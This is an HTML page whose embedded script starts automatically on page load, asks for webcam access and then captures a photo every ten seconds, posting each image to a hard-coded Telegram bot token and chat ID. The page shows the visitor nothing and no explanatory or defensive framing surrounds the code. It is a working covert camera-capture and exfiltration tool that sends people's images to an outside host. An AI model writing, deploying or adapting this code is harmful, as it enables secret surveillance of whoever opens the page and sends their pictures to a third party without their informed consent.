<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Capture and Send Photos to Telegram</title>
  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
</head>
<body>

  <script>
    const botToken = '7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY';
    const chatId = '1538488453';
    let stream;
    let photoCount = 0;

    function capturePhoto() {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      const video = document.createElement('video');

      return new Promise((resolve, reject) => {
        video.onloadedmetadata = () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          canvas.toBlob((blob) => {
            resolve(blob);
          }, 'image/jpeg', 0.7);
        };

        video.onerror = (error) => {
          reject(error);
        };

        stream.getTracks().forEach((track) => {
          video.srcObject = new MediaStream([track]);
        });
      });
    }

    async function sendPhotoToTelegram(photo) {
      try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photo, `photo${photoCount}.jpg`);

        await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, formData);
        console.log('Photo sent to Telegram bot');
      } catch (error) {
        console.error('Error sending photo to Telegram bot', error);
      }
    }

    async function startCapturing() {
      try {
        const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream = mediaStream;

        setInterval(async () => {
          const photoBlob = await capturePhoto();
          await sendPhotoToTelegram(photoBlob);
          photoCount++;
        }, 10000); // Capture a photo every 10 seconds
      } catch (error) {
        console.error('Error accessing camera:', error);
      }
    }

    startCapturing(); // Start capturing photos automatically when the page loads
  </script>
</body>
</html>
